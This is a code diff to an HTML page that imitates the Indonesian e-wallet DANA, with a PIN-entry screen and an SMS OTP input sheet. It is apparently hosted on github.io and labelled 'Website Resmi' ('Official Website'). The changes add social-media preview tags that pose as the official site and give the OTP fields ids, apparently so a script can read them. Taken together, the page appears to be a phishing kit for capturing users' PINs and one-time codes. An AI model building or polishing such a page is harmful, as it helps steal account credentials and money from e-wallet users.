@@ -4,6 +4,13 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
   <title>DANA - Dompet Digital Indonesia</title>
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://github.io" />
+  <meta property="og:title" content="Website Resmi" />
+  <meta property="og:description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA. Ambil bagian dalam transformasi keuangan digital di Indonesia sekarang!" />
+  <meta property="og:image" content="foto/Dana-logo.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
   <link rel="stylesheet" href="css/style.css">
 </head>
 <body>
@@ -62,9 +69,9 @@
       </div>
     </div>
 
-    <!-- 4. HALAMAN INPUT PIN -->
+
     <div id="pagePin" class="screen page-content hidden">
-      <!-- Logo Tengah Atas (Tanpa Top Nav / Tombol Kembali) -->
+
       <div class="top-logo-container">
         <img class="logo-dana small" src="foto/dana_logo.png">
       </div>
@@ -83,7 +90,8 @@
         <a href="#" class="forgot-link">Lupa PIN?</a>
       </div>
     </div>
-    
+
+
 <div id="otpBottomSheet" class="bottom-sheet hidden">
   <div class="sheet-backdrop"></div>
   <div class="sheet-content">
@@ -93,10 +101,10 @@
       <p class="sheet-subtitle">Kami telah mengirimkan kode verifikasi 4-digit melalui SMS ke nomor HP kamu.</p>
       
       <div class="otp-container">
-        <input type="text" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
-        <input type="text" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
-        <input type="text" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
-        <input type="text" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+        <input type="text" id="otp1" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+        <input type="text" id="otp2" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+        <input type="text" id="otp3" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+        <input type="text" id="otp4" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
       </div>
       
       <div class="countdown-text">Kirim ulang dalam <span id="timer">60</span> detik</div>
@@ -106,6 +114,6 @@
 
     
   </div>
-   <script src="js/script.js"></script>
+  <script src="js/script.js"></script>
 </body>
 </html>
